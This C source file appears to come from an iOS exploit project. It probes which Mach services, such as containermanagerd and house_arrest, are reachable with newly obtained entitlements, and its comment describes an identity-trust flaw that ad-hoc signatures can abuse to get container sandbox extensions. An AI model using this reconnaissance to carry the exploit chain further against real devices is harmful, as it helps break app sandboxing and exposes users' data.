/* MCM / house_arrest reachability probe.
 *
 * The "identity trust" flaw (CVE-2026-43689, CWE-862) lives in
 * containermanagerd: it authorises the caller by the CodeDirectory
 * identifier, and with an ad-hoc (ldid) signature the identifier is
 * arbitrary. house_arrest is the front door - a process holding
 * com.apple.mobile.MobileHouseArrest may ask MCM for a container, and
 * MCM issues a sandbox extension for it.
 *
 * This probe only establishes the reachable surface: which of the
 * candidate Mach services answer us with the new entitlements. That tells
 * us whether the VendContainer path is open at all before we implement
 * the plist exchange.
 */
#include "exploit.h"
#include "nk_trace.h"
#include <mach/mach.h>
#include <mach/bootstrap.h>

extern kern_return_t bootstrap_look_up(const char *name, mach_port_t *port);

void nk_mcm_probe(void)
{
    static const char *names[] = {
        "com.apple.containermanagerd",
        "com.apple.containermanagerd.system",
        "com.apple.containermanagerd.system.access",
        "com.apple.mobile.house_arrest",
        "com.apple.mobile.house_arrest.privileged",
        "com.apple.mobile.file_sharing",
        "com.apple.mobile.diagnostics_relay",
        "com.apple.geod",
        "com.apple.installcoordinationd",
        "com.apple.cfprefsd",
        "com.apple.mobile.MobileGestalt",
        NULL
    };
    nk_doc_log_open("mcm.log");
    nk_log("[MCM] === service reachability (with the new entitlements) ===");
    for (uint32_t i = 0; names[i]; i++) {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = bootstrap_look_up(names[i], &port);
        int ok = (kr == KERN_SUCCESS && port != MACH_PORT_NULL);
        nk_log("[MCM] %-45s %s (kr=0x%x)", names[i], ok ? "REACHABLE" : "denied", kr);
        if (ok) {
            nk_doc_log("mcm.log", "[MCM] REACHABLE %s -> port=0x%x", names[i], port);
            mach_port_deallocate(mach_task_self(), port);
        }
    }
    nk_log("[MCM] done");
}
